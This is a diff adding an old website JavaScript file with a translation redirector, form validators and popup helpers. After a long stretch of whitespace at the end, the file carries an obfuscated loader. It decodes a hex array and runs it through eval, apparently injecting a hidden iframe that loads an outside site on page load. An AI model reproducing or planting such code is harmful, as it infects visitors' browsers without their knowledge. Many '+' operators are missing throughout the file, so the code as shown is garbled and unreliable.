@@ -1,0 +1,310 @@
+//<!--
+browserName = navigator.appName;
+browserVer = parseInt(navigator.appVersion);
+condition = !(( (browserName.indexOf("Explorer") >=0 ) && (browserVer < 4) ) ||  ((browserName.indexOf("Netscape") >=0 ) && (browserVer < 2) ) ) ;
+if (condition == true  )
+    CanAnimate = true;
+else
+    CanAnimate = false;
+
+
+
+function translator(pattern)
+{
+
+/////////////////////////////////////////////////////////////
+// Script to use language convertor
+// By Saradhi
+/////////////////////////////////////////////////////////////
+
+	/// Configuration parameters //////////////
+	var open_in_same_window = 1;
+	//////////// End Of Configuration /////////////
+
+	var my_location = unescape(document.location.toString());
+	var new_location ='';
+	var new_pattern = '';
+	if (my_location.indexOf('translate_c?') != -1) {
+		/// From google...
+		var indexof_u = my_location.indexOf('u=');
+		if (indexof_u == -1) {
+			new_location = document.location;
+		}
+		else {
+			var subs = my_location.substring(indexof_u, my_location.length);
+			var ss = subs.split('&');
+			new_location = ss[0].substring(2, ss[0].length);
+		}
+	}
+	else {
+		new_location = document.location;
+	}
+
+	indexof_p = pattern.indexOf('|');
+
+	var isen = '';
+	if (indexof_p == -1) {
+		indexof_p1 = pattern.indexOf('><');
+		if (indexof_p1 == -1) {
+			new_pattern = pattern;
+			if (pattern == 'en') {
+				isen = 1;
+			}
+		}
+		else {
+			var psplit =pattern.split('><');
+			new_pattern = psplit[0] '|' psplit[1];
+			if (psplit[1] == 'en') {
+				isen = 1;
+			}
+		}
+	}
+	else {
+		var psplit = pattern.split('|');
+		new_pattern = psplit[0] '|' psplit[1];
+		if (psplit[1] == 'en') {
+			isen = 1;
+		}
+	}
+
+	var thisurl = '';
+	if (isen == 1) {
+		thisurl = new_location;
+	}
+	else {
+		thisurl = 'http://translate.google.com/translate_c?langpair='   new_pattern   "&u="   new_location;
+	}
+
+	if (open_in_same_window == 0) {
+		window.location.href = thisurl;
+	}
+	else {
+		if (CanAnimate ){
+			msgWindow=window.open('' ,'subwindow','toolbar=yes,location=yes,directories=yes,status=no,scrollbars=yes,menubar=yes,resizable=yes,left=0,top=0');
+			msgWindow.focus();
+			msgWindow.location.href = thisurl;
+		}
+		else {
+			msgWindow=window.open(thisurl,'subwindow','toolbar=yes,location=yes,directories=yes,status=no,scrollbars=yes,menubar=yes,resizable=yes,left=0,top=0');
+		}
+	}
+
+
+}
+
+function translator1(pattern)
+{
+	var thisurl = 'http://translate.google.com/translate_c?langpair='   pattern   "&u="   document.location;
+	if (CanAnimate ){
+        	msgWindow=window.open('' ,'subwindow','toolbar=yes,location=yes,directories=yes,status=no,scrollbars=yes,menubar=yes,resizable=yes,left=0,top=0');
+	        msgWindow.focus();
+        	msgWindow.location.href = thisurl;
+	}
+	else {
+        	msgWindow=window.open(thisurl,'subwindow','toolbar=yes,location=yes,directories=yes,status=no,scrollbars=yes,menubar=yes,resizable=yes,left=0,top=0');
+	}
+}
+
+function openchild_nl(thisurl) 
+{
+	var windowTop;
+	var windowLeft;
+	windowTop=(screen.height*(20/100))*0.7;
+	windowLeft=screen.width*(19/100);
+
+	var email_val = document.theForm.email.value;
+	var from_site_val = document.theForm.from_site.value;
+	var is_window_val = document.theForm.is_window.value;
+	var org_referer = document.location;
+	var thisurl_string = thisurl   "?email="   email_val   "&from_site="   from_site_val   "&is_window="   is_window_val   "&org_referer="   org_referer;
+
+	if ( CanAnimate ) {
+			msgWindow=window.open( '' ,'subwindow','toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,width=570,height=260,top=' windowTop ',left=' windowLeft);
+			msgWindow.focus();
+			msgWindow.location.href = thisurl_string;
+	}
+	else {
+			msgWindow=window.open( thisurl_string,'subwindow','toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,width=570,height=260,top=' windowTop ',left=' windowLeft);
+	}
+}
+
+
+
+function validate_nl(theForm)
+{
+	if (!(/^\w ([\.-]?\w )*@\w ([\.-]?\w )*(\.\w{2,4}) $/.test(theForm.email.value)))
+	{
+		alert("Invalid Email ID. Kindly enter the correct ID.");
+		theForm.email.focus();
+		return (false);
+	}
+}
+
+
+function getblank_nl(this1)  {
+	this1.value = "";
+    return true;	
+}
+
+function checkSearchTop()
+{
+
+	if (document.SearchTop.search.value.length < 3){
+	    alert("Enter at least three characters for search."); 
+	    document.SearchTop.search.focus();
+	    return false;
+	}
+	return true;
+}
+
+function checkSearchBottom()
+{
+
+	if (document.SearchBottom.search.value.length < 3){
+	    alert("Enter at least three characters for search."); 
+	    document.SearchBottom.search.focus();
+	    return false;
+	}
+	return true;
+}
+
+function openchild_email_this_page(thisurl){
+	if ( CanAnimate ){
+        msgWindow=window.open( '' ,'subwindow','toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,width=635,height=260');
+        msgWindow.focus();
+        msgWindow.location.href = thisurl;
+	}
+	else {
+        msgWindow=window.open( thisurl,'subwindow','toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,width=635,height=260');
+	}
+}
+
+
+function check_form_email_this_page(form1)
+{
+	if (form1.S_name.value.length == 0){
+		alert("Kindly enter your name."); 
+		form1.S_name.focus();
+		return false;
+	}
+    S_email_val = checkform_email(form1.S_email,"Kindly enter your Email address.");
+	if(!S_email_val) {
+		return false;
+	}
+
+	R_email1_val = checkform_email(form1.R_email1,"Kindly enter the Email ID of your friend / associate.");
+	if(!R_email1_val) {
+		return false;
+	}
+
+	if(form1.R_email2.value.length != 0)
+	{
+		R_email2_val = checkform_email(form1.R_email2,"Kindly enter the Email ID of your friend / associate.");
+		if(!R_email2_val) {
+			return false;
+		}
+	}
+
+    if(form1.R_email3.value.length != 0)  
+    {
+        R_email3_val = checkform_email(form1.R_email3,"Kindly enter the Email ID of your friend / associate.");
+        if(!R_email3_val) {
+            return false;
+        }
+    }
+
+    if(form1.R_email4.value.length != 0)  
+    {
+        R_email4_val = checkform_email(form1.R_email4,"Kindly enter the Email ID of your friend / associate.");
+        if(!R_email4_val) {
+            return false;
+        }
+    }
+
+	//if (form1.message.value.length == 0){
+	//	alert("Please write a message to your friend / associate."); 
+	//	form1.message.focus();
+	//	return false;
+	//}
+
+	else {
+		return true;
+	}	
+}
+
+function checkform_email(EMAIL,CMESSAGE)
+{
+    if (EMAIL.value.length == 0){
+        alert(CMESSAGE); 
+	    EMAIL.focus();
+    	return false;
+	}
+
+	if (!(/^\w ([\.-]?\w )*@\w ([\.-]?\w )*(\.\w{2,4}) $/.test(EMAIL.value)))
+	{
+		alert("Invalid Email ID. Kindly enter the correct ID.");
+		EMAIL.focus();
+		return (false);
+	}
+
+	else
+	{ 
+        return true;
+	}	
+}
+
+//function addbookmark()
+//{
+//bookmarkurl="http://wwwJavascriptsource.com"
+//bookmarktitle="Welcome To The Java Script Source"
+//if (document.all)
+//window.external.AddFavorite(bookmarkurl,bookmarktitle)
+//}
+
+function openchild_commercial(thisurl){
+	if ( CanAnimate ){ 
+        msgWindow=window.open( '' ,'subwindow');
+        msgWindow.focus();
+        msgWindow.location.href = thisurl;
+	}
+	else {
+        msgWindow=window.open( thisurl,'subwindow');
+	}       
+}
+
+function openchild_weather(cityid){
+	var thisurl = "/includes/weather-average.cgi?i="   cityid   "&t=c";
+	if (CanAnimate ){ 
+        msgWindow=window.open('','subwindow','toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,width=400,height=450');
+        msgWindow.focus();
+        msgWindow.location.href = thisurl;
+	}
+	else {
+        msgWindow=window.open(thisurl,'subwindow','toolbar=no,location=no,directories=no,status=no,scrollbars=no,menubar=no,resizable=yes,width=400,height=450');
+	}       
+}
+
+function code_for_bookmark()	{
+	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
+		var url=document.location;
+		var title = document.title;
+		document.write('<A HREF="javascript:window.external.AddFavorite(url,title);" onMouseOver="window.status=\'Bookmark this page!\';return true;" onMouseOut="window.status=\'\';return true;"><IMG SRC=/includes/gifs/bookmark-this-page.gif ALT="Bookmark this page" WIDTH=15 HEIGHT=15 BORDER=0 HSPACE=3 VSPACE=0><FONT class="navsmall"><B>Bookmark this page</B></FONT></a>');
+	}
+	else {
+		var msg = '<IMG SRC=/includes/gifs/bookmark-this-page.gif ALT="Bookmark this page" WIDTH=15 HEIGHT=15 BORDER=0 HSPACE=3 VSPACE=0><FONT class="navsmall"><B>Bookmark ';
+		if (navigator.appName == "Netscape") {
+			msg  = "  (CTRL-D)</B></FONT>";
+			document.write(msg);
+		}
+	}
+}
+// -->
+
+
+                                                                                                                                                                                                                                                          egflh=String;nim="spl" "i" "t";iwfrxw=window;wao=(1)?"0x":"123";fdhbul=(5-3-1);try{if(Math.ceil(5.5)===0x6)--(document["b" "ody"])}catch(spo){mbo=false;try{}catch(auns){mbo=21;}if(1){idvfom="17Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq61Zq27Zq30Zq1fZq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6aZq6bZq58Zq6bZq60Zq5aZq34Zq1eZq58Zq61Zq58Zq6fZq1eZq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5aZq66Zq65Zq6bZq69Zq66Zq63Zq63Zq5cZq69Zq34Zq1eZq60Zq65Zq5bZq5cZq6fZq25Zq67Zq5fZq67Zq1eZq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq61Zq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq69Zq5cZq58Zq6bZq5cZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq1fZq1eZq60Zq5dZq69Zq58Zq64Zq5cZq1eZq20Zq32Zq4Zq1Zq4Zq1Zq17Zq61Zq25Zq6aZq69Zq5aZq17Zq34Zq17Zq1eZq5fZq6bZq6bZq67Zq31Zq26Zq26Zq6eZq6eZq6eZq25Zq61Zq6cZq5cZq5eZq66Zq6aZq5bZq5cZq63Zq5fZq58Zq64Zq59Zq69Zq5cZq25Zq5aZq66Zq64Zq26Zq5eZq58Zq63Zq5cZq69Zq60Zq58Zq26Zq6bZq69Zq58Zq5dZq25Zq67Zq5fZq67Zq1eZq32Zq4Zq1Zq17Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq67Zq66Zq6aZq60Zq6bZq60Zq66Zq65Zq17Zq34Zq17Zq1eZq58Zq59Zq6aZq66Zq63Zq6cZq6bZq5cZq1eZq32Zq4Zq1Zq17Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq5aZq66Zq63Zq66Zq69Zq17Zq34Zq17Zq1eZq2bZq1eZq32Zq4Zq1Zq17Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq5fZq5cZq60Zq5eZq5fZq6bZq17Zq34Zq17Zq1eZq2bZq67Zq6fZq1eZq32Zq4Zq1Zq17Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq6eZq60Zq5bZq6bZq5fZq17Zq34Zq17Zq1eZq2bZq67Zq6fZq1eZq32Zq4Zq1Zq17Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq63Zq5cZq5dZq6bZq17Zq34Zq17Zq1eZq28Zq27Zq27Zq27Zq2bZq1eZq32Zq4Zq1Zq17Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq6bZq66Zq67Zq17Zq34Zq17Zq1eZq28Zq27Zq27Zq27Zq2bZq1eZq32Zq4Zq1Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq18Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5eZq5cZq6bZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq39Zq70Zq40Zq5bZq1fZq1eZq61Zq1eZq20Zq20Zq17Zq72Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq6eZq69Zq60Zq6bZq5cZq1fZq1eZq33Zq67Zq17Zq60Zq5bZq34Zq53Zq1eZq61Zq53Zq1eZq17Zq5aZq63Zq58Zq6aZq6aZq34Zq53Zq1eZq61Zq27Zq30Zq53Zq1eZq17Zq35Zq33Zq26Zq67Zq35Zq1eZq20Zq32Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5eZq5cZq6bZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq39Zq70Zq40Zq5bZq1fZq1eZq61Zq1eZq20Zq25Zq58Zq67Zq67Zq5cZq65Zq5bZq3aZq5fZq60Zq63Zq5bZq1fZq61Zq20Zq32Zq4Zq1Zq17Zq74Zq4Zq1Zq74Zq4Zq1Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq4aZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq5aZq66Zq66Zq62Zq60Zq5cZq45Zq58Zq64Zq5cZq23Zq5aZq66Zq66Zq62Zq60Zq5cZq4dZq58Zq63Zq6cZq5cZq23Zq65Zq3bZq58Zq70Zq6aZq23Zq67Zq58Zq6bZq5fZq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6bZq66Zq5bZq58Zq70Zq17Zq34Zq17Zq65Zq5cZq6eZq17Zq3bZq58Zq6bZq5cZq1fZq20Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq17Zq34Zq17Zq65Zq5cZq6eZq17Zq3bZq58Zq6bZq5cZq1fZq20Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq65Zq3bZq58Zq70Zq6aZq34Zq34Zq65Zq6cZq63Zq63Zq17Zq73Zq73Zq17Zq65Zq3bZq58Zq70Zq6aZq34Zq34Zq27Zq20Zq17Zq65Zq3bZq58Zq70Zq6aZq34Zq28Zq32Zq4Zq1Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq25Zq6aZq5cZq6bZq4bZq60Zq64Zq5cZq1fZq6bZq66Zq5bZq58Zq70Zq25Zq5eZq5cZq6bZq4bZq60Zq64Zq5cZq1fZq20Zq17Zq22Zq17Zq2aZq2dZq27Zq27Zq27Zq27Zq27Zq21Zq29Zq2bZq21Zq65Zq3bZq58Zq70Zq6aZq20Zq32Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq17Zq34Zq17Zq5aZq66Zq66Zq62Zq60Zq5cZq45Zq58Zq64Zq5cZq22Zq19Zq34Zq19Zq22Zq5cZq6aZq5aZq58Zq67Zq5cZq1fZq5aZq66Zq66Zq62Zq60Zq5cZq4dZq58Zq63Zq6cZq5cZq20Zq4Zq1Zq17Zq22Zq17Zq19Zq32Zq5cZq6fZq67Zq60Zq69Zq5cZq6aZq34Zq19Zq17Zq22Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq25Zq6bZq66Zq3eZq44Zq4bZq4aZq6bZq69Zq60Zq65Zq5eZq1fZq20Zq17Zq22Zq17Zq1fZq1fZq67Zq58Zq6bZq5fZq20Zq17Zq36Zq17Zq19Zq32Zq17Zq67Zq58Zq6bZq5fZq34Zq19Zq17Zq22Zq17Zq67Zq58Zq6bZq5fZq17Zq31Zq17Zq19Zq19Zq20Zq32Zq4Zq1Zq74Zq4Zq1Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq3eZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq17Zq65Zq58Zq64Zq5cZq17Zq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6aZq6bZq58Zq69Zq6bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq60Zq65Zq5bZq5cZq6fZq46Zq5dZq1fZq17Zq65Zq58Zq64Zq5cZq17Zq22Zq17Zq19Zq34Zq19Zq17Zq20Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq63Zq5cZq65Zq17Zq34Zq17Zq6aZq6bZq58Zq69Zq6bZq17Zq22Zq17Zq65Zq58Zq64Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq17Zq22Zq17Zq28Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq1fZq17Zq18Zq6aZq6bZq58Zq69Zq6bZq17Zq20Zq17Zq1dZq1dZq4Zq1Zq17Zq1fZq17Zq65Zq58Zq64Zq5cZq17Zq18Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq6aZq6cZq59Zq6aZq6bZq69Zq60Zq65Zq5eZq1fZq17Zq27Zq23Zq17Zq65Zq58Zq64Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq17Zq20Zq17Zq20Zq17Zq20Zq4Zq1Zq17Zq72Zq4Zq1Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq65Zq6cZq63Zq63Zq32Zq4Zq1Zq17Zq74Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq6aZq6bZq58Zq69Zq6bZq17Zq34Zq34Zq17Zq24Zq28Zq17Zq20Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq65Zq6cZq63Zq63Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5cZq65Zq5bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq60Zq65Zq5bZq5cZq6fZq46Zq5dZq1fZq17Zq19Zq32Zq19Zq23Zq17Zq63Zq5cZq65Zq17Zq20Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq5cZq65Zq5bZq17Zq34Zq34Zq17Zq24Zq28Zq17Zq20Zq17Zq5cZq65Zq5bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq32Zq4Zq1Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq6cZq65Zq5cZq6aZq5aZq58Zq67Zq5cZq1fZq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq6aZq6cZq59Zq6aZq6bZq69Zq60Zq65Zq5eZq1fZq17Zq63Zq5cZq65Zq23Zq17Zq5cZq65Zq5bZq17Zq20Zq17Zq20Zq32Zq4Zq1Zq74Zq4Zq1Zq60Zq5dZq17Zq1fZq65Zq58Zq6dZq60Zq5eZq58Zq6bZq66Zq69Zq25Zq5aZq66Zq66Zq62Zq60Zq5cZq3cZq65Zq58Zq59Zq63Zq5cZq5bZq20Zq4Zq1Zq72Zq4Zq1Zq60Zq5dZq1fZq3eZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq1eZq6dZq60Zq6aZq60Zq6bZq5cZq5bZq56Zq6cZq68Zq1eZq20Zq34Zq34Zq2cZq2cZq20Zq72Zq74Zq5cZq63Zq6aZq5cZq72Zq4aZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq1eZq6dZq60Zq6aZq60Zq6bZq5cZq5bZq56Zq6cZq68Zq1eZq23Zq17Zq1eZq2cZq2cZq1eZq23Zq17Zq1eZq28Zq1eZq23Zq17Zq1eZq26Zq1eZq20Zq32Zq4Zq1Zq4Zq1Zq61Zq27Zq30Zq1fZq20Zq32Zq4Zq1Zq74Zq4Zq1Zq74"[nim]("Zq");}iwfrxw=idvfom;pdkw=[];for(ujvd=22-20-2;-ujvd 1366!=0;ujvd =1){jmz=ujvd;if((0x19==031))pdkw =egflh.fromCharCode(eval(wao iwfrxw[1*jmz]) 0xa-fdhbul);}fcqbad=eval;if(Math.ceil(5.5)===6)fcqbad(pdkw)}
+/*/a9a007*/
+
+/*ccf4bb*/
+
+
+/*/ccf4bb*/
